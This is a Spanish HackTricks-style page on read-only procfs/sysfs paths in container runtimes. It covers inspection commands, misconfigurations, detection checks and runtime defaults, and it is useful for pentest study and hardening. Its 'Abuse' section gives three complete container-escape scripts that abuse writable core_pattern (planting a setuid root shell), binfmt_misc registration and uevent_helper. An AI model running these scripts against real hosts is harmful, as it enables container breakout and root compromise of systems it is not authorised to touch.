# Rutas del sistema de solo lectura

{{#include ../../../../banners/hacktricks-training.md}}

Las rutas del sistema de solo lectura son una protección independiente de las rutas enmascaradas. En lugar de ocultar completamente una ruta, el runtime la expone, pero la monta como de solo lectura. Esto es común en ubicaciones seleccionadas de procfs y sysfs, donde el acceso de lectura puede ser aceptable o necesario desde el punto de vista operativo, pero las escrituras serían demasiado peligrosas.

El propósito es sencillo: muchas interfaces del kernel se vuelven mucho más peligrosas cuando permiten escritura. Un montaje de solo lectura no elimina todo el valor de reconocimiento, pero impide que un workload comprometido modifique los archivos subyacentes orientados al kernel a través de esa ruta.

## Operación

Los runtimes suelen marcar partes de la vista proc/sys como de solo lectura. Dependiendo del runtime y del host, esto puede incluir rutas como:

- `/proc/sys`
- `/proc/sysrq-trigger`
- `/proc/irq`
- `/proc/bus`

La lista exacta varía, pero el modelo es el mismo: permitir la visibilidad cuando sea necesaria y denegar la mutación de forma predeterminada.

## Lab

Inspecciona la lista de rutas de solo lectura declarada por Docker:
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'
```
Inspecciona la vista de proc/sys montada desde dentro del contenedor:
```bash
mount | grep -E '/proc|/sys'
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head
find /sys -maxdepth 3 -writable 2>/dev/null | head
```
## Impacto en la seguridad

Las rutas del sistema de solo lectura reducen una amplia clase de abusos que afectan al host. Incluso cuando un atacante puede inspeccionar procfs o sysfs, no poder escribir allí elimina muchas vías de modificación directa relacionadas con kernel tunables, crash handlers, module-loading helpers u otras interfaces de control. La exposición no desaparece, pero la transición de la divulgación de información a la influencia sobre el host se vuelve más difícil.

## Configuraciones incorrectas

Los errores principales consisten en quitar el enmascaramiento o volver a montar rutas sensibles con permisos de lectura y escritura, exponer directamente el contenido de proc/sys del host mediante bind mounts con permisos de escritura, o utilizar modos privilegiados que eluden de forma efectiva los valores predeterminados más seguros del runtime. En Kubernetes, `procMount: Unmasked` y las cargas de trabajo privilegiadas suelen aparecer junto con una protección más débil de proc. Otro error operativo común es asumir que, como el runtime normalmente monta estas rutas como de solo lectura, todas las cargas de trabajo siguen heredando ese valor predeterminado.

## Abuse

Si la protección es débil, empieza buscando entradas de proc/sys con permisos de escritura:
```bash
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50   # Find writable kernel tunables reachable from the container
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50        # Find writable sysfs entries that may affect host devices or kernel state
```
Cuando hay entradas con permisos de escritura, las rutas de seguimiento de alto valor incluyen:
```bash
cat /proc/sys/kernel/core_pattern 2>/dev/null        # Crash handler path; writable access can lead to host code execution after a crash
cat /proc/sys/kernel/modprobe 2>/dev/null            # Kernel module helper path; useful to evaluate helper-path abuse opportunities
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null      # Whether binfmt_misc is active; writable registration may allow interpreter-based code execution
cat /proc/sys/vm/panic_on_oom 2>/dev/null            # Global OOM handling; useful for evaluating host-wide denial-of-service conditions
cat /sys/kernel/uevent_helper 2>/dev/null            # Helper executed for kernel uevents; writable access can become host code execution
```
Lo que estos comandos pueden revelar:

- Las entradas modificables bajo `/proc/sys` a menudo significan que el contenedor puede modificar el comportamiento del kernel del host, en lugar de limitarse a inspeccionarlo.
- `core_pattern` es especialmente importante porque un valor modificable orientado al host puede convertirse en una vía de ejecución de código en el host al provocar el crash de un proceso después de configurar un pipe handler.
- `modprobe` revela el helper utilizado por el kernel en los flujos relacionados con la carga de módulos; es un objetivo clásico de alto valor cuando se puede modificar.
- `binfmt_misc` indica si es posible registrar intérpretes personalizados. Si el registro se puede modificar, puede convertirse en una primitive de ejecución, en lugar de limitarse a producir un information leak.
- `panic_on_oom` controla una decisión del kernel que afecta a todo el host y, por tanto, puede convertir el agotamiento de recursos en una denegación de servicio del host.
- `uevent_helper` es uno de los ejemplos más claros de cómo una ruta de helper de sysfs modificable puede producir ejecución en el contexto del host.

Entre los hallazgos interesantes se incluyen knobs de proc orientados al host o entradas de sysfs modificables que normalmente deberían ser de solo lectura. En ese punto, la workload ha pasado de una vista restringida del contenedor a ejercer una influencia significativa sobre el kernel.

### Ejemplo completo: escape del host mediante `core_pattern`

Si `/proc/sys/kernel/core_pattern` se puede modificar desde dentro del contenedor y apunta a la vista del kernel del host, puede abusarse de él para ejecutar un payload después de un crash:
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
Si la ruta realmente llega al kernel del host, el payload se ejecuta en el host y deja atrás un shell setuid.

### Ejemplo completo: registro de `binfmt_misc`

Si `/proc/sys/fs/binfmt_misc/register` permite escritura, un registro de intérprete personalizado puede producir ejecución de código cuando se ejecuta el archivo coincidente:
```bash
mount | grep binfmt_misc || mount -t binfmt_misc binfmt_misc /proc/sys/fs/binfmt_misc
cat <<'EOF' > /tmp/h
#!/bin/sh
id > /tmp/binfmt.out
EOF
chmod +x /tmp/h
printf ':hack:M::HT::/tmp/h:\n' > /proc/sys/fs/binfmt_misc/register
printf 'HT' > /tmp/test.ht
chmod +x /tmp/test.ht
/tmp/test.ht
cat /tmp/binfmt.out
```
En un `binfmt_misc` escribible y expuesto al host, el resultado es la ejecución de código en la ruta del intérprete activada por el kernel.

### Ejemplo completo: `uevent_helper`

Si `/sys/kernel/uevent_helper` es escribible, el kernel puede invocar un helper con una ruta del host cuando se activa un evento coincidente:
```bash
cat <<'EOF' > /tmp/evil-helper
#!/bin/sh
id > /tmp/uevent.out
EOF
chmod +x /tmp/evil-helper
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$overlay/tmp/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /tmp/uevent.out
```
La razón por la que esto es tan peligroso es que la ruta del helper se resuelve desde la perspectiva del sistema de archivos del host, en lugar de hacerlo desde un contexto seguro y exclusivo del contenedor.

## Comprobaciones

Estas comprobaciones determinan si la exposición de procfs/sysfs es de solo lectura cuando se espera que lo sea y si la carga de trabajo aún puede modificar interfaces sensibles del kernel.
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'   # Runtime-declared read-only paths
mount | grep -E '/proc|/sys'                                      # Actual mount options
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head           # Writable procfs tunables
find /sys -maxdepth 3 -writable 2>/dev/null | head                # Writable sysfs paths
```
Qué es interesante aquí:

- Una carga de trabajo normal y hardened debería exponer muy pocas entradas de proc/sys con permisos de escritura.
- Las rutas de `/proc/sys` con permisos de escritura suelen ser más importantes que el acceso de solo lectura ordinario.
- Si el runtime indica que una ruta es de solo lectura, pero en la práctica permite escribir en ella, revisa detenidamente la propagación de montajes, los bind mounts y la configuración de privilegios.

## Valores predeterminados del runtime

| Runtime / plataforma | Estado predeterminado | Comportamiento predeterminado | Debilitamiento manual común |
| --- | --- | --- | --- |
| Docker Engine | Activado de forma predeterminada | Docker define una lista predeterminada de rutas de solo lectura para entradas sensibles de proc | exponer montajes de proc/sys del host, `--privileged` |
| Podman | Activado de forma predeterminada | Podman aplica rutas predeterminadas de solo lectura, salvo que se relajen explícitamente | `--security-opt unmask=ALL`, montajes amplios del host, `--privileged` |
| Kubernetes | Hereda los valores predeterminados del runtime | Utiliza el modelo de rutas de solo lectura del runtime subyacente, salvo que se debilite mediante la configuración del Pod o montajes del host | `procMount: Unmasked`, cargas de trabajo privilegiadas, montajes de proc/sys del host con permisos de escritura |
| containerd / CRI-O bajo Kubernetes | Valor predeterminado del runtime | Normalmente depende de los valores predeterminados de OCI/runtime | igual que en la fila de Kubernetes; los cambios directos en la configuración del runtime pueden debilitar este comportamiento |

El punto clave es que las rutas del sistema de solo lectura suelen estar presentes como valor predeterminado del runtime, pero es fácil debilitarlas mediante modos privilegiados o bind mounts del host.
{{#include ../../../../banners/hacktricks-training.md}}
